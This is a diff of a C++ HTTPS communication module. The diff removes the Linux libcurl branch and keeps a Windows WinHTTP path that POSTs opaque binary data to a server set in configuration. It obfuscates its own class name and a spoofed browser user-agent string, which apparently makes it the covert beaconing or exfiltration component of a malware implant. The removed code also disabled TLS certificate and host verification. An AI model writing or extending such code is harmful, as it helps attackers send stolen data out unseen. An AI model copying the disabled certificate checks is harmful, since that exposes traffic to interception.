@@ -8,33 +8,23 @@
 #include <vector>
 #include <cstdint>
 #include <string>
-
-#if PLATFORM_WINDOWS
+#include <windows.h>
 #include <winhttp.h>
+
 #pragma comment(lib, "winhttp.lib")
-#else
-#include <curl/curl.h>
-#endif
 
 // Obfuscated strings
 static const auto OBF_HTTPS_COMMS = OBFUSCATE("HttpsComms");
 static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
 HttpsComms::HttpsComms(Configuration* config)
-    : m_config(config)
-    #if PLATFORM_WINDOWS
-    , m_hSession(NULL), m_hConnect(NULL)
-    #else
-    , m_hSession(nullptr), m_hConnect(nullptr)
-    #endif
-{}
+    : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}
 
 HttpsComms::~HttpsComms() {
     Cleanup();
 }
 
 bool HttpsComms::Initialize() {
-    #if PLATFORM_WINDOWS
     // Windows implementation với WinHTTP
     std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
     
@@ -109,16 +99,9 @@ bool HttpsComms::Initialize() {
 
     LOG_INFO("HTTPS communication initialized successfully");
     return true;
-    
-    #else
-    // Linux implementation - libcurl không cần explicit initialization
-    LOG_INFO("HTTPS communication initialized (using libcurl)");
-    return true;
-    #endif
 }
 
 bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
-    #if PLATFORM_WINDOWS
     // Windows implementation với WinHTTP và SSL
     if (!m_hConnect) {
         LOG_ERROR("HTTPS connection not initialized");
@@ -221,72 +204,8 @@ bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
 
     WinHttpCloseHandle(hRequest);
     return success;
-    
-    #else
-    // Linux implementation với libcurl và SSL
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        LOG_ERROR("Failed to initialize libcurl for HTTPS");
-        return false;
-    }
-
-    std::string url = m_config->GetServerUrl();
-    
-    // Set up curl options cho HTTPS
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_POST, 1L);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
-    
-    // Set headers
-    struct curl_slist* headers = NULL;
-    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
-    std::string requestId = "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16);
-    headers = curl_slist_append(headers, requestId.c_str());
-    headers = curl_slist_append(headers, "Connection: close");
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    
-    // Set timeout
-    int timeout = m_config->GetTimeout();
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout);
-    
-    // Configure SSL
-    if (!ConfigureSslLinux(curl)) {
-        curl_slist_free_all(headers);
-        curl_easy_cleanup(curl);
-        return false;
-    }
-    
-    // Perform request
-    CURLcode res = curl_easy_perform(curl);
-    
-    // Get response code
-    long response_code = 0;
-    if (res == CURLE_OK) {
-        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-    }
-    
-    // Clean up
-    curl_slist_free_all(headers);
-    curl_easy_cleanup(curl);
-    
-    if (res != CURLE_OK) {
-        LOG_ERROR("HTTPS request failed: " + std::string(curl_easy_strerror(res)));
-        return false;
-    }
-    
-    bool success = (response_code >= 200 && response_code < 300);
-    if (!success) {
-        LOG_ERROR("HTTPS request failed with status: " + std::to_string(response_code));
-    } else {
-        LOG_DEBUG("HTTPS request successful, status: " + std::to_string(response_code));
-    }
-    
-    return success;
-    #endif
 }
 
-#if PLATFORM_WINDOWS
 bool HttpsComms::ConfigureSslWindows() {
     // Configure SSL options for WinHTTP
     DWORD securityFlags = 
@@ -323,38 +242,8 @@ bool HttpsComms::ConfigureSslWindows() {
     LOG_DEBUG("SSL configuration applied successfully");
     return true;
 }
-#else
-bool HttpsComms::ConfigureSslLinux(void* curl_ptr) {
-    CURL* curl = static_cast<CURL*>(curl_ptr);
-    
-    // Configure SSL options for libcurl
-    // Tắt certificate verification (cho testing, có thể bật lại cho production)
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    
-    // Set SSL protocols (disable old SSL versions)
-    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2 | CURL_SSLVERSION_MAX_TLSv1_2);
-    
-    // Có thể thêm certificate pinning hoặc custom CA nếu cần
-    /*
-    std::string caBundlePath = m_config->GetCaBundlePath();
-    if (!caBundlePath.empty()) {
-        curl_easy_setopt(curl, CURLOPT_CAINFO, caBundlePath.c_str());
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
-    }
-    */
-    
-    // Set SSL options để tránh các lỗi common
-    curl_easy_setopt(curl, CURLOPT_SSL_OPTIONS, CURLSSLOPT_NO_REVOKE);
-    
-    LOG_DEBUG("SSL configuration applied successfully");
-    return true;
-}
-#endif
 
 void HttpsComms::Cleanup() {
-    #if PLATFORM_WINDOWS
     if (m_hConnect) {
         WinHttpCloseHandle(m_hConnect);
         m_hConnect = NULL;
@@ -363,11 +252,6 @@ void HttpsComms::Cleanup() {
         WinHttpCloseHandle(m_hSession);
         m_hSession = NULL;
     }
-    #else
-    // Cleanup for Linux - libcurl tự quản lý resource
-    m_hConnect = nullptr;
-    m_hSession = nullptr;
-    #endif
     
     LOG_DEBUG("HTTPS communication cleaned up");
 }
